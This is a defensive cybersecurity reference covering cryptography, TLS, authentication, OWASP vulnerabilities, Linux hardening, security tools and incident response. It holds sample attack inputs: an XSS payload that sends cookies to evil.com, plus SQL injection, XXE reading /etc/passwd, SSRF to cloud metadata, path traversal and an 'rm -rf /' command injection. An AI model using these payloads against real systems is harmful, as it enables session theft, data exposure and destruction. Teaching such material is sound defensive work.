# Cybersecurity Fundamentals — The Complete Reference

> Security is not a product, it's a mindset. The best defense is understanding how attacks work.

---

## The Security Mindset

### CIA Triad
- **Confidentiality**: data is only accessible to authorized parties
- **Integrity**: data is accurate and hasn't been tampered with
- **Availability**: systems and data are accessible when needed

### Additional Properties
- **Authentication**: who are you?
- **Authorization**: what are you allowed to do?
- **Non-repudiation**: you can't deny you did it (audit trail, signatures)
- **Accountability**: actions can be traced to individuals

### Threat Modeling (STRIDE)
- **S**poofing: pretending to be someone else
- **T**ampering: modifying data without authorization
- **R**epudiation: denying actions
- **I**nformation disclosure: data leaks
- **D**enial of service: making systems unavailable
- **E**levation of privilege: gaining unauthorized access levels

---

## Cryptography

### Symmetric Encryption
Same key for encrypt and decrypt.

**AES (Advanced Encryption Standard):**
- Block cipher: 128-bit blocks
- Key sizes: 128, 192, 256 bits (AES-256 preferred)
- Modes:
  - **ECB**: DO NOT USE — each block encrypted independently, patterns visible
  - **CBC**: XOR with previous ciphertext block, requires IV
  - **CTR**: uses counter as input, parallelizable
  - **GCM**: CTR + authentication tag (authenticated encryption)
  - **GCM is the standard choice** for modern applications

**ChaCha20-Poly1305:**
- Stream cipher + MAC
- Software-friendly (no hardware acceleration needed)
- Used in TLS 1.3, WireGuard

### Asymmetric (Public Key) Cryptography
Different keys: public (share with world) + private (keep secret).

**RSA:**
- Based on integer factorization hardness
- Key sizes: 2048 minimum, 4096 recommended
- Operations: encrypt with public, decrypt with private
  OR: sign with private, verify with public
- Slow for large data → use for key exchange only

**ECC (Elliptic Curve Cryptography):**
- Based on elliptic curve discrete logarithm
- Much smaller keys: 256-bit ECC ≈ 3072-bit RSA security
- Faster operations
- Curves: P-256 (NIST), Curve25519 (modern preferred), P-384
- **ECDH**: key exchange
- **ECDSA**: digital signatures
- **Ed25519**: fast, secure digital signatures (used in SSH, TLS)

### Hashing
One-way function: input → fixed-size output. Infeasible to reverse.

| Algorithm | Output | Status |
|---|---|---|
| MD5 | 128 bits | Broken — DO NOT USE for security |
| SHA-1 | 160 bits | Deprecated — avoid |
| SHA-256 | 256 bits | Current standard |
| SHA-3 (Keccak) | Variable | Modern, different design |
| BLAKE2 | Variable | Fast, secure, used in many protocols |
| BLAKE3 | Variable | Fastest, parallelizable |

**Properties:**
- **Pre-image resistance**: can't find input from output
- **Second pre-image resistance**: can't find different input with same output
- **Collision resistance**: can't find two inputs with same output

### Password Hashing (Different from Regular Hashing!)
Must be **slow** to resist brute-force:

- **bcrypt**: adaptive, work factor, industry standard
- **Argon2**: winner of Password Hashing Competition, memory-hard
- **scrypt**: memory-hard, CPU-hard
- **PBKDF2**: NIST approved, simpler

```python
# Python (use bcrypt or passlib)
import bcrypt
password = b"mypassword"
salt = bcrypt.gensalt(rounds=12)
hashed = bcrypt.hashpw(password, salt)
bcrypt.checkpw(password, hashed)  # True
```

**NEVER use:** MD5, SHA-1, or plain SHA-256/SHA-512 for passwords (too fast).

### Key Exchange
**Diffie-Hellman:**
- Two parties agree on shared secret without transmitting it
- MITM vulnerable without authentication

**ECDH (Elliptic Curve DH):**
- Modern DH on elliptic curves
- Smaller keys, same security

**Perfect Forward Secrecy (PFS):**
- Generate ephemeral keys per session (ECDHE = Ephemeral ECDH)
- Past sessions can't be decrypted even if long-term key is compromised
- Required in TLS 1.3

### Digital Signatures
- Sign with private key, verify with public key
- Provides: authentication + integrity + non-repudiation

**RSA-PSS, ECDSA, Ed25519** — for signing
**HMAC** — for MAC (requires shared secret)

```python
# Ed25519 signing
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
private_key = Ed25519PrivateKey.generate()
signature = private_key.sign(message)
public_key = private_key.public_key()
public_key.verify(signature, message)  # raises if invalid
```

---

## TLS / HTTPS

### TLS 1.3 Handshake
```
Client → Server: ClientHello (supported ciphers, random, key_share)
Server → Client: ServerHello (chosen cipher, key_share)
                 [Certificate, CertificateVerify, Finished] (encrypted with handshake key)
Client → Server: [Finished]
[Application data flows — encrypted with session keys]
```

**TLS 1.3 improvements over 1.2:**
- 1-RTT handshake (was 2-RTT)
- 0-RTT resumption (early data, with replay risks)
- Removed: RSA key exchange, MD5, SHA-1, DES, 3DES, RC4
- Required: PFS (no static RSA/DH)

### Certificate Chain
```
Root CA (self-signed)
  └── Intermediate CA (signed by Root)
        └── End-entity cert (signed by Intermediate)
```

**Certificate fields:**
- Subject (domain name)
- Issuer
- Public key
- Validity period
- SANs (Subject Alternative Names) — multiple domains
- Key usage, Extended Key Usage

**Certificate Transparency (CT):**
- All public certs must be logged in public CT logs
- `crt.sh` — search CT logs
- Detect unauthorized cert issuance

**OCSP Stapling:**
- Server includes OCSP response in TLS handshake
- Proves cert hasn't been revoked without client querying OCSP

### PKI (Public Key Infrastructure)
- **CA (Certificate Authority)**: issues/signs certificates
- **Let's Encrypt**: free, automated CA
- **Certificate pinning**: app hardcodes expected cert/key hash (avoid for web)

---

## Authentication

### Password Security
- Store as salted, slow hash (bcrypt, Argon2)
- Enforce minimum complexity + length
- Check against known-breached passwords (HaveIBeenPwned API)
- Account lockout after failed attempts
- Secure password reset flow (token with short expiry, invalidate on use)

### Multi-Factor Authentication (MFA)
- Something you know (password)
- Something you have (TOTP token, hardware key)
- Something you are (biometric)

**TOTP (Time-based One-Time Password):**
- RFC 6238
- `TOTP = HOTP(secret, floor(time/30))`
- Google Authenticator, Authy, etc.
- Phishable (can be intercepted in real-time MITM)

**FIDO2 / WebAuthn:**
- Hardware key or biometric as second factor
- Phishing-resistant: bound to origin
- Challenge-response, private key never leaves device
- YubiKey, Windows Hello, Face ID

### JWT (JSON Web Tokens)
```
Header.Payload.Signature
base64url({"alg":"HS256","typ":"JWT"}).base64url({"sub":"1234","exp":1700000000}).signature
```

**Pitfalls:**
- `alg: none` — check algorithm explicitly
- HMAC vs RSA confusion — specify allowed algorithms
- Short expiry for access tokens
- Revocation is hard (stateless) — use Redis blocklist for critical tokens
- Store in httpOnly cookie (not localStorage) to prevent XSS theft

### OAuth 2.0 & OpenID Connect
**OAuth 2.0:** Authorization (not authentication)
- **Authorization Code + PKCE**: for web/mobile apps (most secure)
- **Client Credentials**: service-to-service
- **Implicit**: deprecated (unsafe)
- **Resource Owner Password**: deprecated

**PKCE (Proof Key for Code Exchange):**
```
1. Client generates code_verifier (random 43-128 chars)
2. code_challenge = base64url(SHA256(code_verifier))
3. Include code_challenge in auth request
4. Include code_verifier in token request
5. Server verifies: base64url(SHA256(code_verifier)) == code_challenge
```

**OpenID Connect (OIDC):** Authentication layer on top of OAuth 2.0
- Adds ID token (JWT) with user identity
- Userinfo endpoint
- Discovery document (`/.well-known/openid-configuration`)

---

## Common Vulnerabilities

### OWASP Top 10 (2021)

1. **Broken Access Control** — Most common. Enforce on server side, deny by default
2. **Cryptographic Failures** — Weak/missing encryption, exposing sensitive data
3. **Injection** — SQL, LDAP, OS command injection
4. **Insecure Design** — Lack of threat modeling, insecure design patterns
5. **Security Misconfiguration** — Default creds, verbose errors, unnecessary features enabled
6. **Vulnerable Components** — Outdated libraries with known CVEs
7. **Authentication Failures** — Weak passwords, no MFA, broken session management
8. **SSRF** — Server-Side Request Forgery
9. **Security Logging Failures** — Can't detect or investigate breaches
10. **Injection (additional)** — XSS, template injection

### SQL Injection
```sql
-- Vulnerable:
query = "SELECT * FROM users WHERE name = '" + user_input + "'"
-- Input: ' OR '1'='1  → SELECT * FROM users WHERE name = '' OR '1'='1'

-- Fix: parameterized queries (ALWAYS)
cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))
```

**Blind SQL injection:** No visible error, infer from behavior (true/false responses, timing)

### XSS (Cross-Site Scripting)
```html
<!-- Stored XSS: injected script saved to DB, served to users -->
<script>document.location='https://evil.com/?c='+document.cookie</script>

<!-- Reflected XSS: input reflected in response -->
https://example.com/search?q=<script>alert(1)</script>

<!-- DOM XSS: JavaScript manipulates DOM with attacker-controlled data -->
document.getElementById('name').innerHTML = location.hash.substring(1);
```

**Prevention:**
- Output encoding (HTML escape): `<` → `&lt;`
- Content Security Policy (CSP)
- `httpOnly` cookies (can't be read by JS)

### CSRF (Cross-Site Request Forgery)
```html
<!-- Evil site tricks authenticated user's browser to make requests -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

**Prevention:**
- CSRF tokens (synchronizer token pattern)
- SameSite=Strict/Lax cookie attribute
- Check Origin/Referer headers
- Double Submit Cookie pattern

### SSRF (Server-Side Request Forgery)
```
# Attacker makes server fetch internal resources
POST /api/fetch-url
{"url": "http://169.254.169.254/latest/meta-data/"}  # AWS metadata
{"url": "http://internal-service/admin"}              # Internal services
```

**Prevention:**
- Allowlist of permitted hosts/IPs
- Block private IP ranges (RFC 1918)
- Use metadata endpoint IMDSv2 (AWS)
- Disable redirects or validate redirect destination

### XXE (XML External Entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**Prevention:** Disable DTD processing in XML parsers

### Path Traversal
```
GET /files?path=../../../etc/passwd
```

**Prevention:**
- Canonicalize path, verify it starts with allowed prefix
- `os.path.realpath()` to resolve symlinks and `..`

### Command Injection
```python
# Vulnerable
os.system("ping " + user_input)  # "1.2.3.4; rm -rf /"

# Safe
subprocess.run(["ping", user_input], shell=False)
```

---

## Network Security

### Firewalls
- **Packet filter**: stateless, rules on IP/port
- **Stateful firewall**: tracks connection state
- **Application layer gateway**: understands protocols
- **Next-gen firewall (NGFW)**: DPI, IPS/IDS, SSL inspection

### IDS / IPS
- **IDS**: Intrusion Detection System — alerts on suspicious traffic
- **IPS**: Intrusion Prevention System — blocks suspicious traffic
- **Signature-based**: matches known attack patterns
- **Anomaly-based**: detects deviations from baseline

### VPN
- **IPsec**: Layer 3 tunnel, two modes: transport (payload encrypted) and tunnel (full packet encrypted)
- **OpenVPN**: TLS-based, flexible, widely supported
- **WireGuard**: modern, minimal, state-of-the-art crypto, fast
- **SSL VPN**: browser-based, works over HTTPS

### Zero Trust Architecture
- "Never trust, always verify"
- No implicit trust from network location
- Identity-based access control
- Micro-segmentation
- Continuous verification

---

## Linux Security

### File Permissions & Special Bits
```bash
# SUID (Set User ID) — runs as file owner
chmod u+s /usr/bin/passwd

# SGID (Set Group ID) — runs as file group
chmod g+s /shared/dir/

# Sticky bit — only owner can delete
chmod +t /tmp

# Find SUID binaries (privilege escalation vector)
find / -perm /4000 -type f 2>/dev/null

# Find world-writable directories
find / -type d -perm /o+w 2>/dev/null
```

### sudo & Privilege Escalation
```bash
sudo -l                  # What can current user run?
sudo -u root /bin/bash   # Shell as root
sudo -i                  # Root shell with environment

# /etc/sudoers — configure sudo
user    ALL=(ALL)  ALL           # User can run everything
user    ALL=(ALL) NOPASSWD: ALL  # Without password (dangerous)
%group  ALL=(ALL)  /usr/bin/apt  # Group can only run apt
```

### SELinux
- Mandatory Access Control (MAC) on top of DAC
- Labels on every file, process, port
- Policies define allowed transitions
- Mode: Enforcing → Permissive → Disabled
- Useful commands:
  ```bash
  getenforce
  setenforce 0     # Temporarily permissive
  ausearch -m avc  # Denial messages
  audit2allow -a   # Generate policy from denials
  ```

### Securing SSH
```
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AllowUsers alice bob
Port 2222
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 2
Protocol 2
KexAlgorithms curve25519-sha256,ecdh-sha2-nistp256
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com
```

---

## Security Tools

### Reconnaissance
```bash
# Passive
whois domain.com
dig domain.com ANY
theHarvester -d domain.com -b google    # Email harvesting
shodan search "nginx 1.14"              # Internet-exposed services

# Active (only on authorized targets)
nmap -sV -O -p 1-65535 target
nmap --script vuln target
nmap -p 443 --script ssl-enum-ciphers target
```

### Vulnerability Scanning
- **OpenVAS / Greenbone**: comprehensive vulnerability scanner
- **Nessus**: commercial, industry standard
- **Nikto**: web server scanner
- **Wapiti / OWASP ZAP**: web application scanner

### Web Application Testing
```bash
# OWASP ZAP (automated scanner)
# Burp Suite (proxy + scanner, gold standard)

# Manual with curl
curl -X POST -d "user=' OR 1=1--&pass=x" https://target/login
curl -H "X-Forwarded-For: 127.0.0.1" https://target/admin

# Directory enumeration
gobuster dir -u https://target -w /usr/share/wordlists/dirb/common.txt
ffuf -w wordlist.txt -u https://target/FUZZ
```

### Password Cracking (authorized use only)
```bash
# hashcat
hashcat -m 1000 hashes.txt wordlist.txt   # NTLM hashes
hashcat -m 1800 hashes.txt wordlist.txt   # sha512crypt

# john the ripper
john --wordlist=rockyou.txt hashes.txt

# Common wordlists
# rockyou.txt: 14M common passwords
# SecLists: comprehensive collection
```

---

## Incident Response

### IR Phases
1. **Preparation**: playbooks, tools, contacts
2. **Detection**: alerts, monitoring, user reports
3. **Containment**: isolate affected systems
4. **Eradication**: remove malware, close attack vector
5. **Recovery**: restore systems, verify clean
6. **Lessons Learned**: post-mortem, improve

### Forensic Preservation
```bash
# Preserve memory (volatile data first)
sudo avml /external/memory.lime    # Linux memory acquisition

# Disk imaging
dd if=/dev/sda of=/external/disk.img bs=4M status=progress
sha256sum /dev/sda > /external/disk.sha256  # Hash for chain of custody

# Key artifacts
/var/log/auth.log    # Authentication
/var/log/syslog      # System logs
/var/log/nginx/      # Web server
~/.bash_history      # Command history
/proc/               # Live process info
last, lastb, who     # Login records
```

---

*Security is offense informing defense. Understand how attacks work to build better defenses.*
